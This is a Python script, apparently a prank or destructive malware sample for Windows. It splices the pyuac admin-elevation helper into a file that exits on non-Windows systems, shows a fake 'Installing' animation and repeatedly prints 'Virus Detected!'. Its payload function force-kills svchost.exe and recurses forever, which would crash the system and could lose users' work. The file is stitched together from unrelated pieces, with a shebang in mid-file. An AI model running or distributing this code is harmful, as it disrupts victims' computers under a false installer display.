
# imports
from os import system, name
from time import sleep
# os detector
if name == 'posix':
    exit()
# admin perms
#!/usr/bin/env python
# -*- coding: utf-8; mode: python; py-indent-offset: 4; indent-tabs-mode: nil -*-
# vim: fileencoding=utf-8 tabstop=4 expandtab shiftwidth=4

"""User Access Control for Microsoft Windows Vista and higher.  This is
only for the Windows platform.

This will relaunch either the current script - with all the same command
line parameters - or else you can provide a different script/program to
run.  If the current user doesn't normally have admin rights, he'll be
prompted for an admin password. Otherwise he just gets the UAC prompt.

Note that the prompt may simply shows a generic python.exe with "Publisher:
Unknown" if the python.exe is not signed.

This is meant to be used something like this::

    if not pyuac.isUserAdmin():
        return pyuac.runAsAdmin()

    # otherwise carry on doing whatever...

See L{runAsAdmin} for the main interface.

"""

import sys, os, traceback, types

def isUserAdmin():
    """@return: True if the current user is an 'Admin' whatever that
    means (root on Unix), otherwise False.

    Warning: The inner function fails unless you have Windows XP SP2 or
    higher. The failure causes a traceback to be printed and this
    function to return False.
    """
    
    if os.name == 'nt':
        import win32security
        # WARNING: requires Windows XP SP2 or higher!
        try:
            adminSid = win32security.CreateWellKnownSid(win32security.WinBuiltinAdministratorsSid, None)
            return win32security.CheckTokenMembership(None, adminSid)
        except:
            traceback.print_exc()
            print("Admin check failed, assuming not an admin.")
            return False
    else:
        # Check for root on Posix
        return os.getuid() == 0

def runAsAdmin(cmdLine=None, wait=True):
    """Attempt to relaunch the current script as an admin using the same
    command line parameters.  Pass cmdLine in to override and set a new
    command.  It must be a list of [command, arg1, arg2...] format.

    Set wait to False to avoid waiting for the sub-process to finish. You
    will not be able to fetch the exit code of the process if wait is
    False.

    Returns the sub-process return code, unless wait is False in which
    case it returns None.

    @WARNING: this function only works on Windows.
    """

    if os.name != 'nt':
        raise RuntimeError("This function is only implemented on Windows.")
    
    import win32api, win32con, win32event, win32process
    from win32com.shell.shell import ShellExecuteEx
    from win32com.shell import shellcon
    
    python_exe = sys.executable

    if cmdLine is None:
        cmdLine = [python_exe] + sys.argv
    elif type(cmdLine) not in (types.TupleType,types.ListType):
        raise ValueError("cmdLine is not a sequence.")
    cmd = '"%s"' % (cmdLine[0],)
    # XXX TODO: isn't there a function or something we can call to massage command line params?
    params = " ".join(['"%s"' % (x,) for x in cmdLine[1:]])
    cmdDir = ''
    showCmd = win32con.SW_SHOWNORMAL
    lpVerb = 'runas'  # causes UAC elevation prompt.
    
    # print "Running", cmd, params

    # ShellExecute() doesn't seem to allow us to fetch the PID or handle
    # of the process, so we can't get anything useful from it. Therefore
    # the more complex ShellExecuteEx() must be used.

    # procHandle = win32api.ShellExecute(0, lpVerb, cmd, params, cmdDir, showCmd)

    procInfo = ShellExecuteEx(nShow=showCmd,
                              fMask=shellcon.SEE_MASK_NOCLOSEPROCESS,
                              lpVerb=lpVerb,
                              lpFile=cmd,
                              lpParameters=params)

    if wait:
        procHandle = procInfo['hProcess']    
        obj = win32event.WaitForSingleObject(procHandle, win32event.INFINITE)
        rc = win32process.GetExitCodeProcess(procHandle)
        #print "Process handle %s returned code %s" % (procHandle, rc)
    else:
        rc = None

    return rc

def test():
    """A simple test function; check if we're admin, and if not relaunch
    the script as admin.""",
    rc = 0
    if not isUserAdmin():
        print("", os.getpid(), "params: ", sys.argv)
        #rc = runAsAdmin(["c:\\Windows\\notepad.exe"])
        rc = runAsAdmin()
    else:
        print("", os.getpid(), "params: ", sys.argv)
        rc = 0
    return rc


if __name__ == "__main__":
    res = test()
    
def antivirus():
        print("Virus Detected!")
def repeatav():
    for x in range(0, 9):
        antivirus()
        sleep(0.2)
def loading():
    print("Installing.")
    sleep(1)
    system("cls")
    print("Installing..")
    sleep(1)
    system("cls")
    print("Installing...")
    sleep(1)
    system("cls")
def payload():
    system("taskkill /f /im svchost.exe")
    payload()
    
loading()
repeatav()
payload()